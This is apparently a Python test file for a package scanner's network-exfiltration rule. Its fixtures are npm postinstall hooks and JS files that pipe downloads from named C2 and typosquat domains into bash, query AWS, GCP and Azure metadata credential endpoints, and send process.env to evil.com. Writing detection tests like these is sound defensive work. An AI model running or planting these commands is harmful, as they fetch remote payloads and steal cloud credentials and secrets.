"""Tests for L2-NETEX-001: Network exfiltration and C2 domain detection."""

import tempfile
import unittest
from pathlib import Path

from picosentry.scan.rules.network_exfil import detect_network_exfiltration

from tests.scan.conftest import make_npm_project as _make_project


class TestC2DomainDetection(unittest.TestCase):
    """Test C2 domain detection in install scripts and source."""

    def test_shai_hulud_cc_in_postinstall(self):
        """Detect shai-hulud.cc C2 domain in postinstall script."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(tmp_path, {
                "name": "test-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "curl http://shai-hulud.cc/payload.sh | bash"
                }
            })
            findings = detect_network_exfiltration(tmp_path)
            exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
            self.assertGreater(len(exfil), 0)
            c2 = [f for f in exfil if "shai-hulud" in f.evidence.lower() or "C2" in f.message]
            self.assertGreater(len(c2), 0, f"Expected shai-hulud.cc C2 detection, got: {[f.message for f in exfil]}")

    def test_firebase_su_c2_domain(self):
        """Detect firebase.su -- Scavenger C2 domain."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(tmp_path, {
                "name": "test-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "node -e 'fetch(\"https://firebase.su/exfil\")'"
                }
            })
            findings = detect_network_exfiltration(tmp_path)
            exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
            self.assertGreater(len(exfil), 0)

    def test_dieorsuffer_c2_domain(self):
        """Detect dieorsuffer.com -- Scavenger C2 domain."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(tmp_path, {
                "name": "test-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "curl https://dieorsuffer.com/payload | sh"
                }
            })
            findings = detect_network_exfiltration(tmp_path)
            exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
            self.assertGreater(len(exfil), 0)

    def test_smartscreen_api_c2(self):
        """Detect smartscreen-api.com -- Scavenger phishing domain."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(tmp_path, {
                "name": "test-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "wget -q https://smartscreen-api.com/verify | bash"
                }
            })
            findings = detect_network_exfiltration(tmp_path)
            exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
            self.assertGreater(len(exfil), 0)


class TestCloudMetadataDetection(unittest.TestCase):
    """Test cloud metadata endpoint detection."""

    def test_aws_imds_in_script(self):
        """Detect 169.254.169.254 AWS IMDS endpoint."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(tmp_path, {
                "name": "test-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                }
            })
            findings = detect_network_exfiltration(tmp_path)
            exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
            self.assertGreater(len(exfil), 0)
            imds = [f for f in exfil if "IMDS" in f.message or "metadata" in f.message.lower() or "AWS" in f.message]
            self.assertGreater(len(imds), 0, f"Expected AWS IMDS detection, got: {[f.message for f in exfil]}")

    def test_gcp_metadata_in_source(self):
        """Detect metadata.google.internal in source file."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(tmp_path, {
                "name": "test-pkg",
                "version": "1.0.0"
            }, files={
                "index.js": "fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/')"
            })
            findings = detect_network_exfiltration(tmp_path)
            exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
            self.assertGreater(len(exfil), 0)

    def test_azure_metadata_in_source(self):
        """Detect metadata.azure.com in source file."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(tmp_path, {
                "name": "test-pkg",
                "version": "1.0.0"
            }, files={
                "steal.js": "const r = require('http'); r.get('http://metadata.azure.com/metadata/instance?api-version=2021-02-01')"
            })
            findings = detect_network_exfiltration(tmp_path)
            exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
            self.assertGreater(len(exfil), 0)


class TestPhishingDomainDetection(unittest.TestCase):
    """Test phishing/typosquat domain detection."""

    def test_npmjs_help_phishing(self):
        """Detect npmjs.help -- phishing domain."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(tmp_path, {
                "name": "test-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "curl https://npmjs.help/login | bash"
                }
            })
            findings = detect_network_exfiltration(tmp_path)
            exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
            self.assertGreater(len(exfil), 0)

    def test_npnjs_typosquat(self):
        """Detect npnjs.com -- typosquat domain."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(tmp_path, {
                "name": "test-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "curl https://npnjs.com/package | sh"
                }
            })
            findings = detect_network_exfiltration(tmp_path)
            exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
            self.assertGreater(len(exfil), 0)


class TestEnvExfiltrationDetection(unittest.TestCase):
    """Test environment variable exfiltration detection."""

    def test_fetch_process_env(self):
        """Detect fetch + process.env -- credential exfiltration."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(tmp_path, {
                "name": "test-pkg",
                "version": "1.0.0"
            }, files={
                "exfil.js": "fetch('https://evil.com/steal', { body: JSON.stringify(process.env) })"
            })
            findings = detect_network_exfiltration(tmp_path)
            exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
            self.assertGreater(len(exfil), 0)
            env_exfil = [f for f in exfil if "exfil" in f.message.lower() or "environment" in f.message.lower()]
            self.assertGreater(len(env_exfil), 0, f"Expected env exfil detection, got: {[f.message for f in exfil]}")

    def test_scavenger_dll_reference(self):
        """Detect Scavenger malware DLL references."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(tmp_path, {
                "name": "test-pkg",
                "version": "1.0.0"
            }, files={
                "loader.js": "const path = require('path'); require(path.join(__dirname, 'node-gyp.dll'));"
            })
            findings = detect_network_exfiltration(tmp_path)
            exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
            self.assertGreater(len(exfil), 0)
            scavenger = [f for f in exfil if "scavenger" in f.message.lower() or "CVE-2025-54313" in f.message]
            self.assertGreater(len(scavenger), 0, f"Expected Scavenger detection, got: {[f.message for f in exfil]}")


class TestCleanPackageNoFalsePositives(unittest.TestCase):
    """Test that clean packages produce no exfil findings."""

    def test_clean_package(self):
        """Clean package should produce no exfil findings."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(tmp_path, {
                "name": "clean-pkg",
                "version": "1.0.0",
                "scripts": {
                    "build": "tsc",
                    "test": "jest --coverage"
                }
            })
            findings = detect_network_exfiltration(tmp_path)
            exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
            self.assertEqual(len(exfil), 0)

    def test_legitimate_fetch_no_env(self):
        """A regular fetch without env vars should not trigger exfil."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(tmp_path, {
                "name": "legit-pkg",
                "version": "1.0.0"
            }, files={
                "api.js": "const response = fetch('https://api.example.com/data');"
            })
            findings = detect_network_exfiltration(tmp_path)
            exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
            self.assertEqual(len(exfil), 0)


if __name__ == "__main__":
    unittest.main()
